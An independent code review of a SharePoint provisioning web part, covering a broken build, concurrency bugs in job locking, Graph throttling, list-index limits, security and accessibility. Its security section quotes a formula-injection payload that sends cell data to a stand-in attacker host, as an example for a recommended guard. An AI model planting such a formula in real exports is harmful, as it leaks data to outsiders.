# User Provisioning Center — Independent Technical Review

**Date:** 2026-07-25 (second pass, ~09:20)
**Basis:** the working tree as it stands right now. Earlier review documents in this repo were deliberately not consulted.
**Stack:** SPFx 1.23.2 · React 18.3.1 · Fluent UI v9 · PnPJS v4 · Microsoft Graph (delegated) · TypeScript 5.8

> **Verification status: LIMITED.** `tsc` fails, `heft build` fails at the Sass step, and the test suite cannot run. Findings below come from reading source, not from executing it. Everything in §1 must be fixed before any other finding can even be confirmed.

---

## 1. The tree is currently broken, by two independent causes

### 1a. Automated comment-stripping is destroying code

Something is stripping comments from this repo and treating `//` inside **string and regex literals** as a comment start, deleting the remainder of the line.

```ts
// intended
const body = { '@odata.id': `https://graph.microsoft.com/v1.0/users/${managerId}` };
// on disk right now
const body = { '@odata.id': `https:
```

**Six sites, in files nobody deliberately edited:**

| File | Line | Destroyed |
|---|---|---|
| `src/services/engine/steps/onboardingSteps.ts` | 229 | `assign-manager` `@odata.id` |
| `src/services/engine/steps/onboardingSteps.ts` | 302 | `addGroupMember` directoryObjects bind |
| `src/services/engine/steps/onboardingSteps.ts` | 318 | `batchAddGroupMembers` bind |
| `src/services/engine/steps/onboardingSteps.ts` | 403 | Teams `user@odata.bind` |
| `src/services/engine/steps/transferSteps.ts` | 100 | `update-manager` `@odata.id` |
| `src/services/graph/GraphService.ts` | 52 | `path.replace(/^\//, '')` |

Repair values:

```ts
// onboardingSteps.ts:229  and  transferSteps.ts:100
const body = { '@odata.id': `https://graph.microsoft.com/v1.0/users/${managerId}` };
// onboardingSteps.ts:302 and :318
const body = { '@odata.id': `https://graph.microsoft.com/v1.0/directoryObjects/${userId}` };
// onboardingSteps.ts:403
'user@odata.bind': `https://graph.microsoft.com/v1.0/users('${userId}')`
// GraphService.ts:52
const cleaned: string = path.replace(/^\//, '');
```

The same process transiently broke all six `config/*.json` files by truncating their `$schema` URLs (they have since self-restored — the tree is *churning*, not merely damaged). It has also stripped the codebase's doc comments wholesale, and `src/` has gone from ~21,450 to ~20,070 lines with no functional change.

**This is the top priority and it is not a code-quality issue — it is ongoing data loss.** The silent damage matters more than the six visible breaks: a stripped `//` at the end of a line whose remainder was syntactically optional compiles fine and is quietly wrong. That class cannot be enumerated without a known-good baseline, and there isn't one — `git log` shows a single commit and roughly 30 files of uncommitted work predate this session.

**Recommended immediately:** stop the process, `git add -A && git commit` to create a recovery point, then repair the six sites.

### 1b. Half-applied refactor in the data layer

Separately — and this one is mine, from the interrupted fix session — `SharePointDataService.ts` was rewritten to reference types and methods that were never landed:

- imports `IApprovalRecord`, `IApprovalDelegation`, `IJobQuery`, `IJobSummary`; `src/models/index.ts` exports neither `./IApproval` nor `./IJobQuery`
- `parseJob` writes `approvals`, `targetUpn`, `modifiedUtc`; `IProvisioningJob` (`src/models/IJob.ts`) declares none of them
- `WorkflowEngine.approveJob` (line 213) calls `data.approveJob(itemId)`, which was replaced by `recordApproval` and no longer exists

Either finish it (add the two `export *` lines, extend `IProvisioningJob`, point the engine at `recordApproval`) or revert `SharePointDataService.ts`. Leaving it half-applied is the worst of the three options.

---

## 2. Executive summary

**Score: 6.5 / 10** — for the design. Unscoreable as shipped, because it does not build.

The architecture is sound and in several places genuinely sophisticated. The workflow engine's idempotency model is the strongest part: every step checks before it writes, `create-user` carries a *second* guard for "the POST succeeded but the response was lost," and step state is persisted after every attempt so a closed tab resumes cleanly. That is the hard problem in browser-driven provisioning and it is solved properly. Password generation, hybrid-identity handling and Graph `$batch` sub-response retry are all above the standard I would expect.

The weaknesses cluster in two places: **concurrency control that looks correct but isn't**, and **request volume that works at demo scale and collapses at tenant scale**.

### Top risks

| Risk | Consequence |
|---|---|
| Build is broken (§1) | Nothing ships; nothing else is verifiable |
| `retryStep` releases its lock early (§3.1) | Two engine loops on one job → duplicate accounts, duplicate credentials |
| UPN resolution issues up to ~106 sequential Graph calls per user (§4.1) | Bulk import of 100 rows can mean thousands of round trips; guaranteed throttling |
| `skipStep` writes without the lock (§3.2) | Cross-session ETag conflicts surfacing as unactionable errors |
| Job creation bypasses the authorization service (§3.4) | Anyone who can load the web part can queue provisioning jobs |
| Audit list filters an unindexed column (§4.3) | Audit trail hard-fails past 5,000 rows |
| Ref mutation during render in `useSaveOnUnmount` (§6.2) | Lost wizard drafts under React 18 concurrent rendering |

---

## 3. Correctness and concurrency

### 3.1 — Critical · `retryStep` releases the job lock before the run finishes

`src/services/engine/WorkflowEngine.ts:126-142`

```ts
let etag: string = await this._deps.data.acquireJobLock(itemId, instanceId);
try {
  ...
  return this._execute(itemId, callbacks, signal, etag);   // ← not awaited
} finally {
  await this._deps.data.releaseJobLock(itemId, instanceId).catch(() => undefined);
}
```

`return <promise>` completes the `try` immediately; the `finally` runs *before* the returned promise settles. I confirmed the ordering with an isolated repro — the release fires while `_execute` is still mid-flight. Compare `runJob` at line 85, which does `await this._execute(...)` and is therefore correct.

Two compounding defects on the same path: `retryStep` also never adds `itemId` to `_runningItems`, so `isRunning()` lies during a retry, `runJob`'s guard passes, and the `_pendingSkips` mechanism — which `skipStep` gates on `_runningItems` membership — silently disengages.

**Effect:** roughly one round trip into a retry, the job is unlocked and unguarded. Another tab, another operator, or a second click starts a concurrent `_execute` over the same job. Both loops race the same `StepsJson`. Best case is a 412 storm; worst case is a second TAP, a second password reset, or duplicate group writes, because each loop reads step state the other has not yet written.

**Fix:**

```ts
this._runningItems.add(itemId);
try {
  return await this._execute(itemId, callbacks, signal, etag);
} finally {
  this._runningItems.delete(itemId);
  this._pendingSkips.delete(itemId);
  await this._deps.data.releaseJobLock(itemId, instanceId).catch(() => undefined);
}
```

Better: extract `_withJobLock(itemId, fn)` and route `runJob`, `retryStep` and `skipStep` through it so the sequence exists once. Enable `@typescript-eslint/return-await: ["error", "in-try-catch"]` — that rule catches exactly this.

### 3.2 — High · `skipStep` mutates `StepsJson` with neither lock nor ETag

`WorkflowEngine.ts:170` — `await this._deps.data.updateJobSteps(itemId, job.steps)`, no lock acquired, no ETag passed.

The `_pendingSkips` design handles the same-session race well and is clearly deliberate. But it keys on `_runningItems`, which is process-local: a run in another tab is invisible to it. Cross-session, this write invalidates the running engine's ETag chain, its next `_persist` takes a 412, and — because 412 is correctly classified non-retryable — that surfaces as an opaque error with no conflict semantics.

**Fix:** acquire the lock in `skipStep`; catch 412 in the data layer and translate it to a typed conflict the UI can render as *"this job changed in another session."*

### 3.3 — Medium · `_execute` defaults its ETag to `'*'`

`WorkflowEngine.ts:314` — `let etag: string = initialEtag ?? '*'`. A literal `'*'` matches any version, which disables the optimistic concurrency the rest of the design leans on. Any path reaching `_execute` without a lock-supplied ETag silently runs unguarded.

### 3.4 — High · Job creation is outside the authorization boundary

`IAuthorizationService` gates `runJobs`, `retrySteps`, `skipSteps`, `cancelJobs`, `approveJobs`. It does **not** gate `createJobs` — every submit path calls `services.data.createJob(...)` directly, and `App.tsx` gates only the `tasks`/`templates`/`settings`/`roles` tabs, leaving the wizard, transfer and both bulk tabs visible to a resolved `ReadOnly` operator.

The `createJobs` permission exists in `DEFAULT_ROLE_PERMISSIONS`, which strongly implies it is enforced somewhere. It isn't.

**Fix:** move creation behind `WorkflowEngine.createJob()` with `auth.require('createJobs')`; gate the tabs. Also state plainly in the docs that with delegated permissions this is a workflow boundary, not a security one — the real boundary is SharePoint list permissions plus the operator's Entra role.

### 3.5 — Low · `isTerminal` will throw on an unexpected status

`src/services/engine/jobStateMachine.ts` — `isTerminal` reads `TRANSITIONS[status].length` with no `?? []`, unlike `canTransition` directly above it. `Status` is a SharePoint Choice column an admin can extend; one added choice turns into a `TypeError` that blanks the job drawer.

---

## 4. Performance and scale

### 4.1 — Critical · UPN resolution is pathologically chatty

`src/services/namingPolicy/NamingPolicyService.ts` + `namingPolicy.ts`

`checkUpnAvailability` makes **two sequential Graph calls** per candidate — one against `/users`, one against `/directory/deletedItems`. `resolveNaming` walks up to 3 base candidates, then up to `maxSuffix = 50` suffixed ones, and keeps going after finding a match because it wants 3 spare alternatives.

Worst case for **one user**: ~53 candidates × 2 calls = **~106 sequential round trips**. `BulkImport` calls `naming.resolve` per row at concurrency 5, so a 100-row CSV in a tenant with common surnames can issue several thousand sequential requests. Throttling is not a risk here, it is the expected outcome.

**Fix:** collapse per-candidate probing into one query.

```ts
// one call resolves all base candidates at once
const upns = candidates.map((c) => `'${escapeODataLiteral(`${c}@${domain}`)}'`).join(',');
`/users?$select=userPrincipalName&$filter=userPrincipalName in (${upns})`
```

Do the soft-deleted check once, in parallel, not per candidate. Stop as soon as `chosen` is set unless the caller actually asked for alternatives (the wizard does; bulk import does not). Expect a 20-50× reduction.

### 4.2 — High · `checkUpnAvailability`'s soft-delete probe is likely to fail outright

Same file. The filter is:

```
userPrincipalName eq '…' or mail eq '…'
  or proxyAddresses/any(p:p eq 'smtp:…') or proxyAddresses/any(p:p eq 'SMTP:…')
```

applied to both `/users` **and** `/directory/deletedItems/microsoft.graph.user`. Lambda operators over `proxyAddresses` on the deleted-items collection are not reliably supported; the likely response is a 400. Because this sits on the wizard's critical path, a 400 fails UPN resolution entirely rather than degrading to "couldn't check soft-deleted."

Also note the two `proxyAddresses` clauses differ only in case, and OData string comparison here is already case-insensitive — one of them is dead weight.

**Fix:** query deleted items by `userPrincipalName` only, wrap it so a failure downgrades to a warning instead of failing resolution, and verify the supported filter surface against the tenant before relying on it.

### 4.3 — Critical · Unindexed columns will hard-fail past 5,000 items

`getAuditEntries` filters `JobId eq '…'`; the jobs query sorts on `Modified`; templates and the app catalog filter `IsActive eq 1`. SharePoint refuses a filter or sort on a **non-indexed** column once a list exceeds the 5,000-item list view threshold, and it fails with a server error rather than a truncated result.

`UPC_AuditLog` takes 8-14 rows per onboarding job. A tenant doing 30 hires a month crosses 5,000 in under two years; a large tenant crosses it in weeks. At that point the audit drawer stops working permanently, and once `UPC_ProvisioningJobs` follows, the dashboard goes blank.

This is a cliff, not a slope, and adding an index *after* a list passes the threshold is a maintenance-window operation.

**Fix:** index `JobId` (audit), `Status`/`JobType`/`Created` (jobs), `IsActive` (templates, catalog), `Status` (tasks). Ship an index-repair pass that runs on every provisioning click, not only at list creation — already-deployed tenants are the ones at risk. Order jobs by `Id desc` instead of `Modified`: `Id` is always indexed, it is a monotonic proxy for creation order, and it does not reshuffle rows while the engine writes `StepsJson`. Add a retention/archival story for the audit list.

### 4.4 — High · The dashboard polls full job payloads

`useJobs` polls every 5 s while any job is `Running`, fetching up to 500 rows including `PayloadJson` — which embeds the onboarding photo as a base64 data URL (capped at ~70 KB). Worst case is tens of megabytes per poll to animate one progress bar.

**Fix:** a summary projection for the grid (no `PayloadJson`, no `StepsJson`), full fetch only when the drawer opens, poll only `Status eq 'Running'`, and move the photo out of `PayloadJson`.

### 4.5 — Medium · `copy-groups` is the only unbatched membership path

Every other membership step batches at 20 via `$batch`. `runCopyGroups` loops `addGroupMember` serially — one Graph round trip *and* one audit list write per group. A clone source in 120 groups means 240 sequential requests. `batchAddGroupMembers` already exists and already handles "already a member."

### 4.6 — Medium · `checkMemberGroups` is not chunked to its 20-id limit

`alreadyMemberOf` (onboardingSteps.ts) passes the whole array to `POST /users/{id}/checkMemberGroups`, which accepts at most 20 ids. `RoleService._resolve` chunks correctly; the engine path does not. The resulting 400 is swallowed by the surrounding `getOrNull`, so the idempotency pre-check silently degrades to "member of nothing" and every group is re-attempted on every run. Extract one shared helper — the duplication is what let these diverge.

### 4.7 — Low · `/subscribedSkus` fetched without `$select`

`LicenseService.getSubscribedSkus` pulls whole SKU objects including every `servicePlans` entry. `servicePlans` is genuinely needed for the `includesExchange` flag, so select explicitly rather than dropping it: `$select=skuId,skuPartNumber,capabilityStatus,prepaidUnits,consumedUnits,servicePlans`.

---

## 5. Security

### 5.1 — Medium · CSV exports are not guarded against formula injection

`src/services/util/csv.ts` — `csvCell` quotes per RFC 4180 but does not neutralize a leading `=`, `+`, `-`, `@`, tab or CR. Exported cells carry directory-sourced strings (`displayName`, UPNs, audit actions). A display name of `=HYPERLINK("https://evil.example/"&A1,"x")` executes when an admin opens the export in Excel, and display names are frequently self-service editable.

```ts
const guarded = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
```

### 5.2 — Medium · Audit rows are PII-bearing, unbounded and editable by their own actors

`Actor`, `TargetUser` and `RequestSummary` hold UPNs, employee ids, mobile numbers and personal email addresses in plain text, indefinitely, with no retention policy and no erasure path — a subject-access or erasure request currently has no mechanism behind it.

Redaction is deny-list only (`/pass|tap|secret|credential|token/i` on key names), so any future step passing a secret under a differently-named key leaks it verbatim. Prefer an allow-list of keys permitted into `RequestSummary`.

The audit list is provisioned `WriteSecurity: 2` ("edit own items"), so the person being audited can alter their own records. That is the closest list-level approximation of create-only and a reasonable compromise — but it belongs in the security documentation as an accepted limitation, with Microsoft Purview named as the authoritative trail.

### 5.3 — Medium · Graph consent is broad and all-or-nothing

Eight delegated scopes in one bundle, including `User.ReadWrite.All`, `UserAuthenticationMethod.ReadWrite.All` and `Directory.Read.All`. The mitigating factor is real — delegated effective access is `app scope ∩ operator's Entra role`, and the preflight surfaces that intersection honestly. Still: document the intersection model for the approving admin, and consider isolating TAP creation into a separately-consented isolated web part so the authentication-method scope is not granted to the shared SPO principal.

### 5.4 — Low · Raw error text reaches the UI

The job drawer and preflight bar render `err.message` directly. Graph messages can carry object ids and internal endpoint detail. Map on `graphCode` to localized strings and show `requestId` as a support correlation id — `GraphServiceError` already carries it.

---

## 6. React and front-end

### 6.1 — High · The job drawer resets its own live state on every poll

`JobDetailDrawer` mirrors the `job` prop into `liveJob` in an effect keyed on `[job]`. But `job` is a freshly parsed object on every 5-second poll, so the effect re-fires continuously during a run: `elapsedMs` resets to 0, `hasRun` clears, and engine-supplied progress is overwritten by lagging server state. **The elapsed timer visibly restarts every five seconds.**

The focus effect keyed on `[job, confirmCancel, pendingCredential]` inherits the same problem, so focus is yanked back to the drawer title every five seconds — actively hostile to screen-reader and keyboard users.

**Fix:** key both effects on `job?.itemId`.

### 6.2 — High · `useSaveOnUnmount` mutates a ref during render

```ts
export function useSaveOnUnmount(save: () => void): void {
  const saveRef = React.useRef(save);
  saveRef.current = save;                 // ← side effect during render
  React.useEffect(() => () => saveRef.current(), []);
}
```

Assignment during render is unsafe under React 18 concurrent rendering: a render that gets discarded still mutates the ref, so the unmount callback can fire a stale or wrong closure. This hook guards **wizard draft persistence**, and this app opts into concurrency deliberately (`useTransition`, `useDeferredValue`), so the hazard is live rather than theoretical. Move the assignment into `useLayoutEffect`.

### 6.3 — Medium · Skip is non-deterministic

`JobDetailDrawer.skipStep` aborts the in-flight run, then calls `engine.skipStep`, whose behaviour branches on whether the abort's `finally` has already removed the job from `_runningItems`. Win the race and the run resumes; lose it and nothing happens, with no feedback. Have `skipStep` return an explicit resumed/not-resumed result.

### 6.4 — Medium · Client-side filtering over a server-truncated set

The dashboard filters and searches whatever page happens to be loaded, and hides "load more" whenever a filter is active. Searching for someone in row 600 reports *no matches* — silently wrong rather than merely incomplete. CSV export inherits it. Push search, type and status filters to the server (which needs §4.3's indexes first).

### 6.5 — Medium · No virtualization

`DataGrid` renders every loaded row; each carries a transparent `Button`, a badge and sometimes an approve button. At 500 rows that is ~4,000 elements re-reconciled on every poll and every keystroke.

### 6.6 — Low · Wizard drafts do not survive a refresh

`WizardProvider` holds the draft in `useReducer` with no persistence, while the tab shows a "Draft" badge that implies durability. A refresh silently discards a half-completed onboarding form. Either persist to `sessionStorage` or soften the badge.

---

## 7. Accessibility

- **No `prefers-reduced-motion` anywhere.** The drawer runs an *infinite* 2 s background pulse on the running step and an *infinite* rotation on its icon — on a surface operators watch for the duration of a run. This is the highest-impact a11y gap.
- **Focusable invisible file input.** `PersonalStep` hides `<input type="file">` with the clip technique, leaving it in the tab order but invisible — focus vanishes for keyboard users. The bulk views correctly use `display: none`. Make them consistent.
- **Charts have no text alternative.** Three recharts surfaces expose no data to assistive technology. Render a visually-hidden `<table>` of the same series — it also serves as a fallback if recharts fails to mount.
- **Preflight strings are hard-coded English.** `CAPABILITY_RULES` labels and details bypass `UpcStrings` entirely, while a Swedish locale ships.
- **Step timeline is `div`s.** Use `<ol>`/`<li>` so a screen reader announces "step 3 of 14".
- **Focus stolen every 5 s** — see §6.1.
- **High contrast is Teams-only.** On a SharePoint page, `isInverted` maps to `teamsDarkTheme`, which is not a high-contrast theme. Forced-colors mode needs explicit handling for the custom-drawn surfaces that convey state through background colour.

---

## 8. What is genuinely good

Worth protecting through the repairs:

- **Step idempotency.** Check-before-write everywhere, plus the second guard in `create-user` for a lost POST response. This is the correct model and it is rare to see it done properly.
- **Hybrid identity.** `runBlockSignIn` detects `onPremisesSyncEnabled` and files a task instead of writing `accountEnabled` that the next AAD Connect cycle would revert. Most implementations get this wrong and report success while silently re-enabling the account.
- **`$batch` sub-response retry.** `GraphService.batch` recognises that a 200 envelope can contain 429 sub-responses and retries only those, honouring per-sub `Retry-After`.
- **Password generation.** `crypto.getRandomValues` with rejection sampling, an unbiased Fisher-Yates shuffle, and an alphabet that excludes visually ambiguous characters.
- **Secret lifecycle.** Secrets live only in `IJobSecrets`, are deleted at run end, are never serialized, and the copy-once dialog is `modalType="alert"`.
- **`IdPrefixProvider` outside `FluentProvider`** — the correct mitigation for the SharePoint Fluent v9 class-name collision.
- **Type discipline.** Not one `as any` or `: any` in `src`. Discriminated payload unions with real type guards.
- **The doc comments** — the `_pendingSkips` race explanation, the hybrid-identity rationale, the "no wait-for-mailbox step" note. These were the best documentation in the repo, which is precisely why the stripping in §1a is so costly.

---

## 9. Recommended order of work

**Now — restore the tree**
1. Stop the comment-stripping process.
2. `git add -A && git commit` for a recovery point.
3. Repair the six sites in §1a.
4. Resolve the half-applied data-layer refactor (§1b) — finish or revert.
5. Confirm `tsc`, `heft build` and the test suite are green again. Nothing below is verifiable until they are.

**Immediate — correctness**
6. `retryStep` lock lifetime + `_runningItems` registration (§3.1); extract `_withJobLock`.
7. Lock `skipStep`; type the 412 conflict (§3.2).
8. Gate `createJobs` in the engine and in the tabs (§3.4).
9. Chunk `checkMemberGroups` at 20 (§4.6).
10. Guard `isTerminal` (§3.5).

**Immediate — scale**
11. Column indexes + repair pass + audit retention (§4.3).
12. Rewrite UPN resolution to batch its probes, and make the soft-delete check non-fatal (§4.1, §4.2).

**Short term**
13. Dashboard summary projection and running-only polling (§4.4).
14. CSV formula guard (§5.1).
15. Drawer effect keys (§6.1) and `useSaveOnUnmount` (§6.2).
16. `prefers-reduced-motion`, file input, preflight localization (§7).
17. Batch `copy-groups` (§4.5).

**Medium term**
18. Server-side search/filter (§6.4) and grid virtualization (§6.5).
19. Component tests — there are currently none, and every §6 finding is a component defect that a first render test would have caught.
20. Accessible chart alternatives; high-contrast and forced-colors verification.

---

## 10. Closing

The design here is better than the current state of the repository suggests. The engine's idempotency and resume model, the hybrid-identity handling and the batch retry logic are the work of someone who knows this platform well. The recurring weakness is a specific one worth naming: **several mechanisms are correct in their happy path and wrong at the edge** — a `finally` that runs a beat too early, a lock that one caller skips, a Graph limit that one of two call sites respects, a filter that works until a list crosses 5,000 rows. Unit tests do not reach any of those; a lock-lifetime assertion and a handful of render tests would reach most of them.

Fix §1 first. Everything else is unverifiable until the project compiles.
